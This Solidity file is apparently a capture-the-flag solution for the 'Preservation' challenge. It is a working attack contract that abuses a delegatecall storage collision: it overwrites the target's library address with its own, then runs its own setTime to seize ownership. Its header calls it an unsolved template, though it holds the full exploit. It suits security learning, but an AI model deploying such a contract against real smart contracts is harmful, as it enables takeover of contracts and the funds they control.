pragma solidity ^0.7.3;
/**
* Attack contract boilerplate template. 
* Useful to create an attack contract for a new challenge without accidentally
* peaking at the solution.
*/

interface IPreservationChallenge {
    function setFirstTime(uint _timeStamp) external;
    function setSecondTime(uint _timeStamp) external;
}

contract PreservationAttacker {

    // Replicate the same storage layout as the target contract
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;

    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    IPreservationChallenge public challenge;

    constructor(address challengeAddress) {
        challenge = IPreservationChallenge(challengeAddress);
    }

    function attack() external payable {
        // See this video for how the attack works:
        // https://www.youtube.com/watch?v=oinniLm5gAM

        // Overwrite timeZone1Library with the address of this contract
        challenge.setSecondTime(uint(address(this)));
        // Trigger a call to the contract in slot 0 which should be this
        // contract after the previous step.
        // This will then call the setTime() function in this contract.
        challenge.setFirstTime(1); // param doesn't matter as it's not processed
    }
    function setTime(uint _time) public {
        // Set the owner of the contract to the EOA.
        // We could have used msg.sender instead to change this contract
        // to own the target contract.
        owner = tx.origin;
    }
}
